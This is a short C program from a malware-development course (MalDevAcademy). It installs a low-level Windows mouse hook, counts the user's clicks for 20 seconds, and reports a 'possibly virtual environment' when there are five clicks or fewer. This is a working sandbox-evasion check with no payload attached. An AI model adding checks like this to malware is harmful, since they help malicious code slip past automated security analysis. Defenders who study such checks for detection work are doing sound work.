// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>


#define MONITOR_TIME   20000 // monitor mouse clicks for 20 seconds


// global hook handle variable
HHOOK g_hMouseHook      = NULL;
// global mouse clicks counter
DWORD g_dwMouseClicks   = NULL;


// the callback function that will be executed whenever the user clicked a mouse button
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam){

    // WM_RBUTTONDOWN :         "Right Mouse Click"
    // WM_LBUTTONDOWN :         "Left Mouse Click"
    // WM_MBUTTONDOWN :         "Middle Mouse Click"

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        printf("[+] Mouse Click Recorded \n");
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}



BOOL MouseClicksLogger(){
    
    MSG         Msg         = { 0 };

    // installing hook 
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
    }

    // process unhandled events
    while (GetMessageW(&Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }
    
    return TRUE;
}




int main() {

    HANDLE  hThread         = NULL;
    DWORD   dwThreadId      = NULL;

    // running the hooking function in a seperate thread for 'MONITOR_TIME' ms
    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        printf("\t\t<<>> Thread %d Is Created To Monitor Mouse Clicks For %d Seconds <<>>\n\n", dwThreadId, (MONITOR_TIME / 1000));
        WaitForSingleObject(hThread, MONITOR_TIME);
    }

    // unhooking
    if (g_hMouseHook && !UnhookWindowsHookEx(g_hMouseHook)) {
        printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
    }

    // the test
    printf("[i] Monitored User's Mouse Clicks : %d ... ", g_dwMouseClicks);
    // if less than 5 clicks - its a sandbox
    if (g_dwMouseClicks > 5)
        printf("[+] Passed The Test \n");
    else
        printf("[-] Posssibly A Virtual Environment \n");


    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}